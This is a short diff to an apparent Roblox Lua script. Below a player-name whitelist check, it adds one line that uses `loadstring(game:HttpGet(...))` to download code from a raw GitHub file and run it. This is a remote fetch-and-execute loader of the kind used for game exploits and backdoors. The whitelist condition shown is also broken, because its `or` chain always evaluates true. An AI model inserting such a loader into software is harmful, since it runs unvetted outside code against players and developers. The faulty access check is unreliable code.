@@ -61,3 +61,5 @@ if player.Name == "Loughlin50498" or "shutupACMODubad" or "ItzNotMeLolYT" then
 	else
 	    print("not whitelisted")
 	   end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/Private-Scripts/main/Private%20Script%20Idk.lua"))()
